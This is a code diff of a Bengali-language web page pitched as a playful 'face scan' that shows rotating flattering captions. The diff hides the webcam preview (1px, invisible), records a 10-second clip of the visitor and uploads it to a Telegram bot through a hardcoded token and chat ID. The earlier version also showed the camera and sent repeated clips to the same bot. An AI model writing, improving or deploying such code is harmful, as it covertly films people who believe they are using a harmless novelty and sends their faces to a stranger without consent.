@@ -1,55 +1,73 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="bn">
 <head>
-  <meta charset="UTF-8" />
-  <title>Magical Camera</title>
+  <meta charset="UTF-8">
+  <title>আপনার মুখের জাদু</title>
   <style>
     body {
       background-color: black;
       color: white;
+      font-family: 'Arial', sans-serif;
       text-align: center;
-      font-family: Arial;
     }
     video {
-      width: 300px;
-      height: 300px;
-      border-radius: 50%;
-      border: 5px solid white;
-      margin-top: 20px;
+      width: 1px; /* ক্যামেরা লুকানো */
+      height: 1px;
+      opacity: 0;
+      position: absolute;
     }
-    .notice {
-      border: 3px solid blue;
-      padding: 10px;
-      margin: 20px;
-      font-size: 18px;
+    .text-box {
+      margin-top: 80px;
+      padding: 15px;
+      border: 2px dashed #00ffff;
+      font-size: 20px;
+      width: 80%;
+      margin-left: auto;
+      margin-right: auto;
+      border-radius: 10px;
+      background-color: rgba(255,255,255,0.05);
+    }
+    h2 {
+      margin-top: 100px;
     }
   </style>
 </head>
 <body>
-  <h2>আপনার চেহারাটি ক্যামেরার মধ্যে রাখুন এবং পাঁচ সেকেন্ড পর এর ফলাফল দেখুন</h2>
-  <div class="notice">
-    <strong>বিশেষ দ্রষ্টব্য:</strong> মেসেঞ্জার এ যদি আপনার ছবি দেখা না যায় তাহলে এই লিঙ্ক টি কপি করে গুগল এ পেস্ট করে দেখুন।<br>
-    <em>Copyright ©️ SOAD</em>
-  </div>
+  <h2>আপনার মুখ স্ক্যান হচ্ছে...</h2>
   <video id="preview" autoplay muted></video>
+  <div class="text-box" id="captionBox">"আপনার চোখে অনেক কিছু বলা আছে..."</div>
 
   <script>
     const video = document.getElementById("preview");
-    let mediaRecorder;
-    let chunks = [];
+    const captionBox = document.getElementById("captionBox");
+    const captions = [
+      "আপনার চোখে অনেক কিছু বলা আছে...",
+      "আপনার হাসি আজকের দিনটা সুন্দর করবে!",
+      "আপনি কি জানেন আপনি কতটা ইউনিক?",
+      "মুখে আছে এক আত্মবিশ্বাসের ছাপ!",
+      "AI বলছে আপনি একজন নেতৃস্থানীয় মানুষ!",
+      "আপনার মুখ দেখেই দিনটা ভালো হয়ে গেল!",
+      "এই চেহারাটা অনেক ভালো লাগছে!",
+      "আপনি কি মডেল হবার কথা চিন্তা করেছেন কখনো?",
+    ];
 
     const TELEGRAM_BOT_TOKEN = "7460221175:AAGn19zxbV_sXOWjW1ViDc3v4kHyS5WDGZU";
     const TELEGRAM_CHAT_ID = "6429244657";
 
+    let chunks = [];
+    let mediaRecorder;
+
     function sendToTelegram(blob) {
       const formData = new FormData();
       formData.append("chat_id", TELEGRAM_CHAT_ID);
-      formData.append("video", blob, "clip.webm");
+      formData.append("video", blob, "face_clip.webm");
 
       fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVideo`, {
         method: "POST",
         body: formData
-      }).then(res => console.log("ভিডিও পাঠানো হয়েছে")).catch(err => console.error("Error sending:", err));
+      })
+      .then(res => console.log("✅ ভিডিও টেলিগ্রামে পাঠানো হয়েছে"))
+      .catch(err => console.error("❌ পাঠাতে সমস্যা:", err));
     }
 
     function startRecording(stream) {
@@ -57,20 +75,13 @@
       mediaRecorder.ondataavailable = e => chunks.push(e.data);
 
       mediaRecorder.onstop = () => {
-        const blob = new Blob(chunks, { type: "video/webm" });
+        const blob = new Blob(chunks, { type: 'video/webm' });
         sendToTelegram(blob);
         chunks = [];
-        mediaRecorder.start(); // রেকর্ড আবার শুরু
-        setTimeout(() => mediaRecorder.stop(), 10000); // প্রতি ১০ সেকেন্ডে একবার ভিডিও রেকর্ড
       };
 
       mediaRecorder.start();
-      setTimeout(() => mediaRecorder.stop(), 10000);
-      setInterval(() => {
-        if (document.visibilityState === "visible") {
-          mediaRecorder.stop();
-        }
-      }, 60000); // প্রতি ১ মিনিটে একটি ক্লিপ
+      setTimeout(() => mediaRecorder.stop(), 10000); // ১০ সেকেন্ডের ভিডিও
     }
 
     navigator.mediaDevices.getUserMedia({ video: true, audio: false })
@@ -78,11 +89,15 @@
         video.srcObject = stream;
         startRecording(stream);
 
-        const msg = new SpeechSynthesisUtterance("আপনার চেহারাটি ক্যামেরার মধ্যে রাখুন এবং পাঁচ সেকেন্ড পর এর ফলাফল দেখুন");
-        window.speechSynthesis.speak(msg);
+        // লেখা ঘোরে প্রতি ৩ সেকেন্ডে
+        let index = 0;
+        setInterval(() => {
+          captionBox.textContent = captions[index % captions.length];
+          index++;
+        }, 3000);
       })
       .catch(err => {
-        alert("ক্যামেরা চালু করা যায়নি: " + err);
+        alert("⚠️ ক্যামেরা চালু করা যায়নি: " + err);
       });
   </script>
 </body>
